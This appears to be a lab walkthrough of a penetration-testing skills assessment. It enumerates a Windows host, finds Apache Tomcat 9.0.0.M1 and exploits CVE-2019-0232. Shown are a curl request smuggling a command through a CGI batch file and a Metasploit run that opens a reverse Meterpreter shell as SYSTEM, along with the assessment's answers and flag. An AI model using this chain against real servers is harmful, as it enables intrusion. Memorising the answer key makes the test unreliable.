# Attacking Common Applications - Skills Assessment I
During a penetration test against the company Inlanefreight, you have performed extensive enumeration and found the network to be quite locked down and well-hardened. You come across one host of particular interest that may be your ticket to an initial foothold. Enumerate the target host for potentially vulnerable applications, obtain a foothold, and submit the contents of the flag.txt file to complete this portion of the skills assessment.

## Questions
1. What vulnerable application is running? **Answer: tomcat**
   - Run a nmap scan on all ports → notice it is running vulnerable version of Apache Tomcat/9.0.0.M1:
        ```shellsession
        $ sudo nmap -sV -sC -Pn -p- -T4 10.129.64.118
        Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-27 06:11 EDT
        Nmap scan report for 10.129.64.118
        Host is up (0.16s latency).
        Not shown: 65516 closed tcp ports (reset)
        PORT      STATE SERVICE       VERSION
        21/tcp    open  ftp           Microsoft ftpd
        | ftp-syst: 
        |_  SYST: Windows_NT
        | ftp-anon: Anonymous FTP login allowed (FTP code 230)
        |_09-01-21  08:07AM       <DIR>          website_backup
        80/tcp    open  http          Microsoft IIS httpd 10.0
        | http-methods: 
        |_  Potentially risky methods: TRACE
        |_http-title: Freight Logistics, Inc
        |_http-server-header: Microsoft-IIS/10.0
        135/tcp   open  msrpc         Microsoft Windows RPC
        139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
        445/tcp   open  microsoft-ds?
        3389/tcp  open  ms-wbt-server Microsoft Terminal Services
        |_ssl-date: 2026-06-27T11:15:28+00:00; +59m59s from scanner time.
        | ssl-cert: Subject: commonName=APPS-SKILLS1
        | Not valid before: 2026-06-26T11:08:16
        |_Not valid after:  2026-12-26T11:08:16
        | rdp-ntlm-info: 
        |   Target_Name: APPS-SKILLS1
        |   NetBIOS_Domain_Name: APPS-SKILLS1
        |   NetBIOS_Computer_Name: APPS-SKILLS1
        |   DNS_Domain_Name: APPS-SKILLS1
        |   DNS_Computer_Name: APPS-SKILLS1
        |   Product_Version: 10.0.17763
        |_  System_Time: 2026-06-27T11:15:19+00:00
        5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-title: Not Found
        |_http-server-header: Microsoft-HTTPAPI/2.0
        8000/tcp  open  http          Jetty 9.4.42.v20210604
        |_http-server-header: Jetty(9.4.42.v20210604)
        | http-robots.txt: 1 disallowed entry 
        |_/
        |_http-title: Site doesn't have a title (text/html;charset=utf-8).
        8009/tcp  open  ajp13         Apache Jserv (Protocol v1.3)
        |_ajp-methods: Failed to get a valid response for the OPTION request
        8080/tcp  open  http          Apache Tomcat/Coyote JSP engine 1.1
        |_http-server-header: Apache-Coyote/1.1
        |_http-favicon: Apache Tomcat
        |_http-title: Apache Tomcat/9.0.0.M1
        47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-server-header: Microsoft-HTTPAPI/2.0
        |_http-title: Not Found
        49664/tcp open  msrpc         Microsoft Windows RPC
        49665/tcp open  msrpc         Microsoft Windows RPC
        49666/tcp open  msrpc         Microsoft Windows RPC
        49667/tcp open  msrpc         Microsoft Windows RPC
        49668/tcp open  msrpc         Microsoft Windows RPC
        49669/tcp open  msrpc         Microsoft Windows RPC
        49670/tcp open  msrpc         Microsoft Windows RPC
        49675/tcp open  msrpc         Microsoft Windows RPC
        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
        ```

2. What port is this application running on? **Answer: 8080**
3. What version of the application is in use? **Answer: 9.0.0.M1**
4. Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop. **Answer: f55763d31a8f63ec935abd07aee5d3d0**
   - Apache Tomcat/9.0.0.M1 is vulnerable to CVE-2019-0232 which is a conditional RCE (vulnerable version running on Windows with `enableCmdLineArguments` enabled)
   - Try to identify if `enableCmdLineArguments` is enabled by bruteforcing for CGI scripts → Found `cmd.bat`:
        ```shellsession
        $ ffuf -u http://10.129.67.19:8080/cgi/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .bat

                /'___\  /'___\           /'___\       
            /\ \__/ /\ \__/  __  __  /\ \__/       
            \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                \ \_\   \ \_\  \ \____/  \ \_\       
                \/_/    \/_/   \/___/    \/_/       

            v2.1.0-dev
        ________________________________________________

        :: Method           : GET
        :: URL              : http://10.129.67.19:8080/cgi/FUZZ
        :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
        :: Extensions       : .bat 
        :: Follow redirects : false
        :: Calibration      : false
        :: Timeout          : 10
        :: Threads          : 40
        :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
        ________________________________________________

        cmd.bat                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 202ms]
        :: Progress: [9500/9500] :: Job [1/1] :: 255 req/sec :: Duration: [0:00:37] :: Errors: 0 ::
        ```
   - Confirm it with a simple `dir`:
        ```shellsession
        $ curl 'http://10.129.67.19:8080/cgi/cmd.bat?&dir'
        [1]+  Done                    curl http://10.129.67.19:8080/cgi/cmd.bat?
        Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi

        12/09/2025  04:36 AM    <DIR>          .
        12/09/2025  04:36 AM    <DIR>          ..
        09/01/2021  07:58 AM    <DIR>          %SystemDrive%
        08/31/2021  01:55 PM                48 cmd.bat
                    1 File(s)             48 bytes
                    3 Dir(s)   6,765,953,024 bytes free
        ```
   - Run the exploit with metasploit:
        ```shellsession
        $ msfconsole
        Metasploit tip: Tired of setting RHOSTS for modules? Try globally 
        setting it with setg RHOSTS x.x.x.x
                                                        
                    .;lxO0KXXXK0Oxl:.
                ,o0WMMMMMMMMMMMMMMMMMMKd,
                'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
            :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
            .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
        lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
        xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
        oMMMMMMMMMMx.                    dMMMMMMMMMMx
        .WMMMMMMMMM:                       :MMMMMMMMMM,
        xMMMMMMMMMo                         lMMMMMMMMMO
        NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
        MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
        NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
        xMMMMMMMMMd                        ,0MMMMMMMMMMK;
        .WMMMMMMMMMc                         'OMMMMMM0,
        lMMMMMMMMMMk.                         .kMMO'
        dMMMMMMMMMMWd'                         ..
        cWMMMMMMMMMMMNxc'.                ##########
            .0MMMMMMMMMMMMMMMMWc            #+#    #+#
            ;0MMMMMMMMMMMMMMMo.          +:+
                .dNMMMMMMMMMMMMo          +#++:++#+
                'oOWMMMMMMMMo                +:+
                    .,cdkO0K;        :+:    :+:                                
                                        :::::::+:
                            Metasploit

            =[ metasploit v6.4.111-dev                               ]
        + -- --=[ 2,607 exploits - 1,323 auxiliary - 1,707 payloads     ]
        + -- --=[ 429 post - 49 encoders - 14 nops - 9 evasion          ]

        Metasploit Documentation: https://docs.metasploit.com/
        The Metasploit Framework is a Rapid7 Open Source Project

        [msf](Jobs:0 Agents:0) >> search CVE-2019-0232

        Matching Modules
        ================

        #  Name                                         Disclosure Date  Rank       Check  Description
        -  ----                                         ---------------  ----       -----  -----------
        0  exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability


        Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/tomcat_cgi_cmdlineargs

        [msf](Jobs:0 Agents:0) >> use 0
        [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
        [msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set RHOSTS 10.129.67.19
        RHOSTS => 10.129.67.19
        [msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set TARGETURI /cgi/cmd.bat
        TARGETURI => /cgi/cmd.bat
        [msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set LHOST 10.10.15.124
        LHOST => 10.10.15.124
        [msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set ForceExploit true
        ForceExploit => true
        [msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> exploit
        [*] Started reverse TCP handler on 10.10.15.124:4444 
        [*] Running automatic check ("set AutoCheck false" to disable)
        [!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
        [*] Command Stager progress -  60.25% done (6999/11616 bytes)
        [*] Sending stage (190534 bytes) to 10.129.67.19
        [*] Command Stager progress - 100.00% done (11616/11616 bytes)
        [!] Make sure to manually cleanup the exe generated by the exploit
        [*] Meterpreter session 1 opened (10.10.15.124:4444 -> 10.129.67.19:49688) at 2026-06-29 00:40:35 -0400

        (Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) > shell
        Process 5344 created.
        Channel 1 created.
        Microsoft Windows [Version 10.0.17763.107]
        (c) 2018 Microsoft Corporation. All rights reserved.

        C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi>whoami
        whoami
        nt authority\system

        C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi>more C:\Users\Administrator\Desktop\flag.txt
        more C:\Users\Administrator\Desktop\flag.txt
        f55763d31a8f63ec935abd07aee5d3d0
        ```